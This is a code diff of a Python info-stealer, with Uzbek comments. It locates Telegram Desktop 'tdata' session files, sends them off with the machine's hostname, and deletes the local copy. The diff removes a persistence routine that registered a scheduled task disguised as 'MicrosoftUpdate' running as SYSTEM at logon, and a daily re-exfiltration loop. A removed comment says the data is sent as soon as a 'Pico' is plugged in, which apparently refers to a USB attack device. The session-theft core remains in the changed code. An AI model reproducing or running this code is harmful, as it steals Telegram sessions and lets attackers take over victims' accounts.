@@ -6,7 +6,6 @@ import urllib.request
 import socket
 import tempfile
 import zipfile
-import subprocess
 import sys
 
 if os.name == 'nt':
@@ -64,38 +63,12 @@ def get_tdata():
             return None
     return None
 
-def install_persistence():
-    try:
-        script_path = os.path.join(os.environ['APPDATA'], 'checker.py')
-        if not os.path.exists(script_path):
-            content = urllib.request.urlopen(sys.argv[0] if len(sys.argv) > 0 else __file__).read().decode()
-            with open(script_path, 'w') as f:
-                f.write(content)
-        subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f', '/it'], shell=True)
-        send_message(f"✅ Checker o'rnatildi: {socket.gethostname()}")
-    except:
-        pass
-
 # MAIN
-install_persistence()
-
-# PICO TIQILGAN ZAHOTI BIRINCHI TDATANI YUBORADI
 tdata_path = get_tdata()
 if tdata_path:
     send_file(tdata_path, f"⚡ Pico birinchi tdata yubordi!\n🖥 {socket.gethostname()}")
     os.remove(tdata_path)
 
-# ENDI HAR KUNI (24 SOATDA) YUBORADI
-last_sent_time = time.time()
-
-while True:
-    time.sleep(3600)  # Har soatda tekshiradi
-    try:
-        if time.time() - last_sent_time > 86400:  # 24 soat = 86400 soniya
-            tdata_path = get_tdata()
-            if tdata_path:
-                send_file(tdata_path, f"✅ Kunlik yangi tdata yig'ildi!\n🖥 {socket.gethostname()}")
-                os.remove(tdata_path)
-            last_sent_time = time.time()
-    except:
-        pass
+# Agar Telegram Desktop ochiq bo'lmasa, yuborish uchun uni ochishga harakat qiling
+if not tdata_path:
+    send_message(f"⚠️ tdata topilmadi!\n🖥 {socket.gethostname()}")
